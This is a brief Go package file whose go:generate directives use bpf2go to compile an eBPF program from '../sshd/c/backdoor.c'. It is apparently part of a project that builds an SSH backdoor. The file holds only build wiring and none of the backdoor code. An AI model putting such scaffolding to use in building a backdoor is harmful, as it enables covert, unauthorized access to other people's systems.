// generated package contains auto compiled eBPF byte code.
package generate

// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.
////go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS bpf ../sshd/c/backdoor.c -- -I ../headers
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ../sshd/c/backdoor.c -- -I../headers
